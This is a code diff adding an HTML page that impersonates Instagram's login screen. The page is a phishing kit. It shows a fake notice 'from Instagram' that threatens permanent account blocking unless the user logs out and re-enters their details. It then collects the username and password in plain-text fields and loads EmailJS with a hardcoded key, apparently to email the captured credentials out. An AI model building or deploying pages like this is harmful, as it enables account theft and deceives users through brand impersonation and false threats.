@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram.com</title>
+    <link rel="icon" type="image/jpg" href="instagramimage.favicon.jpg">
+    <link rel="stylesheet" href="style.css">
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+    </script>
+    <script type="text/javascript">
+        (function () {
+            emailjs.init({
+                publicKey: "Y12bkDC-PMcVBFf-j",
+            });
+        })();
+    </script>
+</head>
+
+<body>
+    <div class="messageforlogout">
+        <h3>This Important message is from Instagram to Verify user's account.</h3>
+        <p>If you are in your current account then go first and log out from current account and we will send a Login form fill correctly and verified your account .Please follow the instructions carefully to avoid any inconvenience else your account can be blocked permanently.</p>
+        <div class="logoutBtn">
+            <button type="submit" id="OkForLogout">OK</button>
+            <button style="visibility: hidden;" type="submit" id="submitForLogout">Finshed</button>  
+        </div>
+    </div>
+    <div class="mainContainer">
+
+        <div class="instagramname container">
+            <img src="instagramimage.favicon.jpg" alt="instaimage">
+            <!-- <h2><i>instagram</i></h2> -->
+        </div>
+
+        <!-- <div class="email container">
+            <input type="email" placeholder="email" id="email">
+        </div> -->
+
+        <div class="username container">
+            <input type="text" placeholder="username" id="username">
+        </div>
+
+        <div class="username container">
+            <input type="text" placeholder="Password" id="password">
+        </div>
+
+        <!-- <div class="username container">
+            <input type="text" placeholder="Verify Password" id="verify">
+        </div> -->
+
+        <div class="loginbtn container">
+            <button type="submit" id="logi">Log in</button>
+        </div>
+
+        <div class="or container">
+            <hr>
+            <p> OR </p>
+            <hr>
+        </div>
+
+        <div class="facebooklink container">
+            <img src="facebookimage.png" height="20px" alt="facebook logo">
+            <p id="loginfacebook">Log in with facebook</p>
+        </div>
+
+        <div class="forgotpassword container">
+            <p>Forgot password</p>
+        </div>
+
+        <div class="haveAccount container">
+            <p>Don't have an account? </p>
+            <p class="signup">Sign up</p>
+        </div>
+
+        <div class="messagebox">
+            <button type="submit" id="xbtn">X</button>
+            <p id="message">Please Fill full details</p>
+        </div>
+    </div>
+
+
+    <script src="main.js"></script>
+</body>
+
+</html>
